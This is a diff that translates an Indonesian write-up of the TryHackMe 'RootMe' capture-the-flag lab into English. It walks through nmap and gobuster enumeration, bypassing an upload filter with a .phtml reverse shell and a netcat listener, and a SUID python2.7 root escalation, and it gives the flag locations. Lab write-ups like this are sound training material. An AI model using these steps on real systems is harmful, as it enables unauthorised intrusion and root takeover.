@@ -1,14 +1,14 @@
 # CTF RootMe (TryHackMe)
 
-## 1. Informasi Target & Penyerang
+## 1. Target and Attacker Information
 
 **Target IP:**
 `10.48.188.9`
 
-**Mesin Penyerang:**
+**Attacker Machine:**
 Kali Linux 25.3 (Running on UTM - Apple Silicon M5)
 
-**Tools Utama:**
+**Main Tools:**
 
 * Nmap
 * Gobuster
@@ -17,59 +17,59 @@ Kali Linux 25.3 (Running on UTM - Apple Silicon M5)
 
 ---
 
-# 2. Tahap Enumerasi (Pengumpulan Informasi)
+## 2. Enumeration (Information Gathering)
 
-Langkah awal dilakukan untuk memetakan layanan yang aktif pada server target.
+The first step was to identify the active services on the target server.
 
-## Scanning Port
+### Port Scanning
 
-Melakukan scanning menggunakan **Nmap** untuk mengidentifikasi layanan yang berjalan.
+I used **Nmap** to identify the running services.
 
 ```bash
 nmap -sV 10.48.188.9
 ```
 
-### Hasil
+#### Results
 
-| Port | Service | Versi               |
+| Port | Service | Version               |
 | ---- | ------- | ------------------- |
 | 22   | SSH     | OpenSSH 7.6p1       |
 | 80   | HTTP    | Apache httpd 2.4.29 |
 
 ---
 
-## Directory Discovery
+### Directory Discovery
 
-Dilakukan brute-force direktori menggunakan **Gobuster** untuk menemukan direktori tersembunyi.
+I used **Gobuster** to discover hidden directories through directory brute forcing.
 
 ```bash
 gobuster dir -u http://10.48.188.9 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-### Hasil
+#### Results
 
-Ditemukan dua direktori penting:
+Two important directories were found:
 
-* `/panel/` → Form upload file
-* `/uploads/` → Tempat penyimpanan file hasil upload
+* `/panel/` → File upload form
+* `/uploads/` → Storage location for uploaded files
 
 ---
 
-# 3. Tahap Eksploitasi (Gaining Access)
+## 3. Exploitation (Gaining Access)
 
-Pada tahap ini dilakukan percobaan untuk mendapatkan akses ke sistem melalui celah **File Upload Vulnerability**.
+At this stage, I attempted to gain system access through a **file upload vulnerability**.
 
-## Vulnerability
+### Vulnerability
 
-Server memblokir file dengan ekstensi:
+The server blocked files with the following extension:
 
 ```
 .php
 ```
 
-## Bypass Filter
+### Bypassing the Filter
 
-Filter berhasil dilewati dengan mengganti ekstensi reverse shell menjadi:
+The filter was bypassed by changing the reverse shell's file extension to:
 
 ```
 .phtml
@@ -77,27 +77,27 @@ Filter berhasil dilewati dengan mengganti ekstensi reverse shell menjadi:
 
 ---
 
-## Langkah Eksploitasi
+### Exploitation Steps
 
-1. Mengunggah file **reverse shell** bernama:
+1. Upload a **reverse shell** file named:
 
 ```
 shell.phtml
 ```
 
-melalui halaman:
+through the following page:
 
 ```
 /panel/
 ```
 
-2. Menyiapkan listener pada mesin Kali Linux:
+2. Prepare a listener on the Kali Linux machine:
 
 ```bash
 nc -lvnp 1234
 ```
 
-3. Mengakses file shell melalui browser:
+3. Open the shell file in the browser:
 
 ```
 http://10.48.188.9/uploads/shell.phtml
@@ -105,9 +105,9 @@ http://10.48.188.9/uploads/shell.phtml
 
 ---
 
-## Hasil
+### Results
 
-Berhasil mendapatkan **reverse shell** dengan hak akses user:
+The **reverse shell** connected with the privileges of:
 
 ```
 www-data
@@ -115,21 +115,21 @@ www-data
 
 ---
 
-# 4. Tahap Eskalasi Hak Akses (Privilege Escalation)
+## 4. Privilege Escalation
 
-Setelah mendapatkan akses sebagai user biasa, langkah selanjutnya adalah mencari cara untuk meningkatkan hak akses menjadi **root**.
+After gaining access as a regular user, the next step was to find a way to escalate privileges to **root**.
 
-## Analisis SUID
+### SUID Analysis
 
-Mencari binary dengan **SUID bit aktif** menggunakan perintah:
+Search for binaries with the **SUID bit set** using:
 
 ```bash
 find / -perm -4000 2>/dev/null
 ```
 
-### Temuan
+#### Findings
 
-Binary berikut memiliki izin **SUID**:
+The following binary had the **SUID** permission bit set:
 
 ```
 /usr/bin/python2.7
@@ -137,9 +137,9 @@ Binary berikut memiliki izin **SUID**:
 
 ---
 
-## Eksploitasi
+### Exploitation
 
-Menggunakan Python untuk menjalankan shell dengan mempertahankan hak akses SUID.
+Use Python to start a shell while retaining the elevated privileges provided by SUID.
 
 ```bash
 python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
@@ -147,15 +147,15 @@ python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
 ---
 
-## Hasil
+### Results
 
-Berhasil mendapatkan akses sebagai:
+Access was obtained as:
 
 ```
 root
 ```
 
-Verifikasi menggunakan perintah:
+Verify the result with:
 
 ```bash
 whoami
@@ -169,11 +169,11 @@ root
 
 ---
 
-# 5. Penemuan Flag
+## 5. Finding the Flags
 
-## User Flag
+### User Flag
 
-Lokasi file:
+File location:
 
 ```
 /var/www/user.txt
@@ -181,9 +181,9 @@ Lokasi file:
 
 ---
 
-## Root Flag
+### Root Flag
 
-Lokasi file:
+File location:
 
 ```
 /root/root.txt
@@ -191,8 +191,8 @@ Lokasi file:
 
 ---
 
-# Kesimpulan
+## Conclusion
 
-Mesin **RootMe** memiliki kerentanan pada fitur **file upload** yang memungkinkan penyerang mengunggah **reverse shell** dengan mem-bypass filter ekstensi file. Setelah mendapatkan akses sebagai user `www-data`, penyerang dapat melakukan **Privilege Escalation** melalui binary `python2.7` yang memiliki **SUID bit aktif**, sehingga memungkinkan eksekusi shell dengan hak akses **root**.
+The **RootMe** machine had a **file upload vulnerability** that allowed an attacker to upload a **reverse shell** by bypassing the file extension filter. After gaining access as `www-data`, the attacker could perform **privilege escalation** through the `python2.7` binary, whose **SUID bit was set**, allowing a shell to run with **root** privileges.
 
 ---
